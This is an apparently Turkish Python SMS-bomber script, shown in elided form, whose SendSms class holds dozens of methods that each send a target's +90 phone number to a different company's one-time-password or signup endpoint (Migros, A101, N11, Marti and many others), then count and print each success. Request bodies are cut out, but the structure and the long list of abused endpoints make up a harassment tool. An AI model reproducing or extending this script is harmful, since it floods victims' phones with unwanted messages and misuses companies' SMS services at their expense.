...
class SendSms():
    ...
    def Kigili(self):    
        try:
            ...
            if kigili.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ kigili.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[✖] {Style.RESET_ALL}API Başarısız! Numara: +90{self.phone} Numara: +90{self.phone} ➜ kigili.com")
    ...
    def KahveDunyasi(self):    
        try:    
            ...
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
    ...
    def NaosStars(self):
        try:
            ...
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ shop.naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
    ...
    def Wmf(self):
        try:
            ...
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
    ...
    def IsteGelsin(self):
        try:
            ...
            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Bim(self):
        try:
            ...
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Sok(self):
        try:
            ...
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.ceptesok.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Tiklagelsin(self):
        try:
            ...
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Migros(self):
        try:
            ...
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def A101(self):
        try:
            ...
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
    ...
    def Englishhome(self):
        try:
            ...
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ englishhome.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Sakasu(self):
        try:
            ...
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Rentiva(self): 
        try:
            ...
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ rentiva.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Bineq(self):
        try:
            ...
            if bineq.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Link(self):
        try:
            ...
            if link.json()["detail"] == "Ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ consumer-auth.linkfleet.de")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Lonca(self):
        try:
            ...
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Dgn(self):
        try:
            ...
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ odeme.dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Yaani(self):
        try:
            ...
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.yaanimail.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Defacto(self):
        try:
            ...
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ defacto.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Mopas(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Icq(self):
        try:
            ...
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ u.icq.net")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Boyner(self):
        try:
            ...
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ boyner.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Watsons(self):
        try:
            ...
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ watsons.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Buyur(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ app.buyursungelsin.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Osmanlideal(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ osmgck.idealdata.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Pinar(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.text == "true":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ pinarsumobileservice.yasar.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Suiste(self):
        try:
            ...
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ suiste.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Hayat(self):
        try:
            ...
            if (r.json()["IsSuccessful"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Pisir(self):
        try:
            ...
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def KimGb(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def IkinciYeni(self):
        try:
            ...
            if (r.json()["isSucceed"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ apigw.ikinciyeni.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Terra(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.terrapizza.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def IpraGaz(self):
        try:
            ...
            if (r.json()["phoneNumber"]) == str(self.phone):
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Mogaz(self):
        try:
            ...
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mogazmobilapinew.aygaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def GoMobile(self):
        try:
            ...
            if (r.json()["data"]["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ gomobilapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def PetrolOfisi(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mobilapi.petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Total(self):
        try:
            ...
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mobileapi.totalistasyonlari.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Opet(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.opet.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Dolap(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api-gateway.dolap.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Hey(self):
        try:
            ...
            if (r.json()["IsSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Tazi(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Isbike(self):
        try:
            ...
            if (r.json()["sonuc"]["aciklama"]) == "İşlem API Başarılı!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ app.isbike.istanbul")
                self.adet += 1
            else:
                raise
        except:
    ...
    def N11(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Joker(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Ebebek(self):
        try:
            ...
            if r.json()["status"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api2.e-bebek.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Saka(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ mobilcrm2.saka.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Gofody(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ backend.gofody.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Madame(self):
        try:
            ...
            if (r.status_code) == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ madamecoco.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Buludag(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ bilet.balikesiruludag.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Evidea(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ evidea.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Koctas(self):
        try:
            ...
            if (r.json()["status"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ occ2.koctas.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Gratis(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ ivt.mobildev.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Anadolu(self):
        try:
            ...
            r = requests.get(url)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ anadolu.com.tr")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Accordors(self):
        try:
            ...
            r = requests.post(url, json=json)
            if r.json()["data"]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ aouws.accordors.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Marti(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Hop(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.hoplagit.com")
                self.adet += 1
            else:
                raise
        except:
    ...
    def Karma(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}API Başarılı! Numara: +90{self.phone} ➜ api.gokarma.app")
                self.adet += 1
            else:
                raise
        except:
